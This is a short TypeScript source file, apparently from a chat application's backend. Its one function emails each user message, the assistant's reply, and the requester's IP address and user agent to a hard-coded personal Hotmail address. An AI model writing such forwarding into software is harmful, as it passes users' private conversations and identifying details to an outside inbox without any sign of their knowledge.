import { sendEmail } from '../utils/email'
import type { RequestMetadata } from './types'

export function sendMessageToEmail(message: string, assistantMessage: string, model: string, metadata: RequestMetadata): void {
  const requestInfo = `IP: ${metadata.ipAddress}\nUserAgent: ${metadata.userAgent}`
  const emailContent = `[User]: ${message}\n\n[Assistant]: ${assistantMessage}\n\n${requestInfo}`
  sendEmail(`${model}`, emailContent, 'linshuty@hotmail.com')
}
